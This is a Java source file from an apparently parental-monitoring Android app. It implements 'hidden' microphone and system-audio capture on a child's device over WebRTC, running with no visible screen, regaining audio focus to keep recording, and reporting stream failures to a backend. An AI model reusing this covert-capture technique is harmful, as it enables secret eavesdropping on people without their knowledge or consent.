package com.oney.WebRTCModule;

import android.content.Context;
import android.media.AudioAttributes;
import android.media.AudioFocusRequest;
import android.media.AudioManager;
import android.media.AudioManager.OnAudioFocusChangeListener;
import android.os.Build;
import android.util.Log;

import com.facebook.react.bridge.Arguments;
import com.facebook.react.bridge.Promise;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReadableMap;
import com.facebook.react.bridge.WritableMap;

import com.childmonitor.capture.StreamSessionRegistry;
import com.childmonitor.sync.DeviceHttpClient;

import java.lang.reflect.Field;

/**
 * Hidden microphone capture — no MainActivity. Uses {@link GetUserMediaImpl} audio path.
 */
public final class HiddenAudioBridge {

    private static final String TAG = "HiddenAudioBridge";
    private static volatile String activeStreamId = null;
    private static volatile AudioFocusRequest audioFocusRequest = null;
    private static volatile ReactApplicationContext activeReactContext = null;
    private static volatile Runnable onStopForegroundCallback = null;

    private static void handleUnrecoverableFocusLoss() {
        ReactApplicationContext ctx = activeReactContext;
        Context appContext = ctx != null ? ctx.getApplicationContext() : null;
        Runnable stopFgs = onStopForegroundCallback;
        onStopForegroundCallback = null;
        Log.w(TAG, "Audio focus lost permanently — tearing down mic stream");
        if (ctx != null) {
            stopActiveCapture(ctx);
        }
        if (stopFgs != null) {
            try {
                stopFgs.run();
            } catch (Exception e) {
                Log.w(TAG, "onStopForeground after focus loss failed", e);
            }
        }
        if (appContext != null) {
            String sessionId = StreamSessionRegistry.INSTANCE.activeSessionId();
            if (sessionId != null && !sessionId.isBlank()) {
                final Context reportCtx = appContext;
                final String sid = sessionId;
                new Thread(() -> DeviceHttpClient.INSTANCE.reportStreamFailure(
                        reportCtx, sid, "AUDIO_FOCUS_LOST")).start();
            }
        }
    }

    private static final OnAudioFocusChangeListener AUDIO_FOCUS_LISTENER = focusChange -> {
        Log.d(TAG, "audio focus change=" + focusChange);
        if (activeStreamId == null || activeReactContext == null) {
            return;
        }
        if (focusChange == AudioManager.AUDIOFOCUS_LOSS) {
            // Permanent loss only — TRANSIENT/DUCK must not tear down the child's mic mid-call
            // (another app briefly playing media is common on the child device).
            boolean regained = requestAudioFocus(activeReactContext.getApplicationContext());
            if (!regained) {
                handleUnrecoverableFocusLoss();
            }
        } else if (focusChange == AudioManager.AUDIOFOCUS_LOSS_TRANSIENT
                || focusChange == AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK) {
            Log.i(TAG, "MIC_FOCUS_TRANSIENT change=" + focusChange + " — keeping capture alive");
            requestAudioFocus(activeReactContext.getApplicationContext());
        }
    };

    private HiddenAudioBridge() {}

    private static boolean requestAudioFocus(Context context) {
        AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            AudioAttributes attrs = new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                    .build();
            AudioFocusRequest req = new AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
                    .setAudioAttributes(attrs)
                    .setOnAudioFocusChangeListener(AUDIO_FOCUS_LISTENER)
                    .build();
            int result = am.requestAudioFocus(req);
            if (result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED) {
                audioFocusRequest = req;
                return true;
            }
            Log.w(TAG, "Audio focus not granted result=" + result);
            return false;
        }
        @SuppressWarnings("deprecation")
        int legacy = am.requestAudioFocus(
                null,
                AudioManager.STREAM_VOICE_CALL,
                AudioManager.AUDIOFOCUS_GAIN);
        return legacy == AudioManager.AUDIOFOCUS_REQUEST_GRANTED;
    }

    private static void abandonAudioFocus(Context context) {
        AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            AudioFocusRequest req = audioFocusRequest;
            audioFocusRequest = null;
            if (req != null) {
                am.abandonAudioFocusRequest(req);
            }
            return;
        }
        @SuppressWarnings("deprecation")
        int ignored = am.abandonAudioFocus(null);
    }

    public static boolean isCaptureActive() {
        return activeStreamId != null;
    }

    public static void stopActiveCapture(ReactApplicationContext reactContext) {
        String streamId = activeStreamId;
        if (streamId == null) {
            return;
        }
        activeStreamId = null;
        activeReactContext = null;
        onStopForegroundCallback = null;
        abandonAudioFocus(reactContext.getApplicationContext());
        try {
            WebRTCModule webrtc = reactContext.getNativeModule(WebRTCModule.class);
            if (webrtc != null) {
                webrtc.mediaStreamRelease(streamId);
            }
        } catch (Exception e) {
            Log.w(TAG, "stopActiveCapture failed", e);
        }
    }

    /** Returns true when a microphone-type foreground service is active. */
    public interface ForegroundGate {
        boolean enter();
    }

    public static void createAudioStream(
            ReactApplicationContext reactContext,
            Promise promise,
            ForegroundGate foregroundGate,
            Runnable onStopForeground
    ) {
        createAudioStream(reactContext, promise, foregroundGate, onStopForeground, true);
    }

    /**
     * @param exclusiveAudioFocus when true (mic / video-call), request AUDIOFOCUS_GAIN which
     *     pauses other media apps. When false (system AudioPlaybackCapture injection), do not
     *     steal focus or other apps' YouTube/Spotify video+audio will freeze/pause.
     */
    public static void createAudioStream(
            ReactApplicationContext reactContext,
            Promise promise,
            ForegroundGate foregroundGate,
            Runnable onStopForeground,
            boolean exclusiveAudioFocus
    ) {
        new Thread(() -> {
            try {
                stopActiveCapture(reactContext);
                onStopForegroundCallback = onStopForeground;

                if (!foregroundGate.enter()) {
                    promise.reject(
                            "AUDIO_FGS_FAILED",
                            "Microphone foreground service did not start — required for background audio on Android 14+");
                    return;
                }
                Log.i(TAG, exclusiveAudioFocus ? "MIC_CAPTURE_STARTED" : "PLAYBACK_INJECT_CAPTURE_STARTED");

                if (exclusiveAudioFocus) {
                    if (!requestAudioFocus(reactContext.getApplicationContext())) {
                        onStopForeground.run();
                        promise.reject("AUDIO_FOCUS_DENIED", "Microphone audio focus was denied by the system");
                        return;
                    }
                } else {
                    Log.i(TAG, "skipping exclusive audio focus — playback capture must not pause media apps");
                }

                WebRTCModule webrtc = reactContext.getNativeModule(WebRTCModule.class);
                if (webrtc == null) {
                    onStopForeground.run();
                    promise.reject("NO_WEBRTC", "WebRTC module unavailable");
                    return;
                }

                GetUserMediaImpl mediaImpl = getUserMediaImpl(webrtc);
                WritableMap constraints = Arguments.createMap();
                WritableMap audio = Arguments.createMap();
                // Playback-inject path: disable AEC/NS/AGC so we do not process system mix as speech.
                boolean processing = exclusiveAudioFocus;
                audio.putBoolean("echoCancellation", processing);
                audio.putBoolean("noiseSuppression", processing);
                audio.putBoolean("autoGainControl", processing);
                constraints.putMap("audio", audio);

                mediaImpl.getUserMedia(
                        constraints,
                        args -> {
                            try {
                                String streamId = args[0].toString();
                                com.facebook.react.bridge.WritableArray tracks =
                                        (com.facebook.react.bridge.WritableArray) args[1];
                                if (tracks == null || tracks.size() == 0) {
                                    onStopForeground.run();
                                    promise.reject("NO_TRACK", "Audio track missing");
                                    return;
                                }
                                activeStreamId = streamId;
                                activeReactContext = reactContext;
                                onStopForegroundCallback = onStopForeground;
                                Log.i(TAG, "MIC_PCM_GENERATED track=" + tracks.getMap(0).getString("id"));
                                WritableMap data = Arguments.createMap();
                                data.putString("streamId", streamId);
                                data.putMap("track", tracks.getMap(0));
                                promise.resolve(data);
                            } catch (Exception e) {
                                onStopForeground.run();
                                promise.reject("HIDDEN_AUDIO_PARSE_ERROR", e);
                            }
                        },
                        args -> {
                            onStopForeground.run();
                            String message = args.length > 1 ? String.valueOf(args[1]) : "Audio capture failed";
                            promise.reject("HIDDEN_AUDIO_ERROR", message);
                        }
                );
            } catch (Exception e) {
                Log.e(TAG, "Hidden audio capture failed", e);
                onStopForeground.run();
                promise.reject("HIDDEN_AUDIO_ERROR", e);
            }
        }).start();
    }

    private static GetUserMediaImpl getUserMediaImpl(WebRTCModule module) throws Exception {
        Field field = WebRTCModule.class.getDeclaredField("getUserMediaImpl");
        field.setAccessible(true);
        return (GetUserMediaImpl) field.get(module);
    }
}
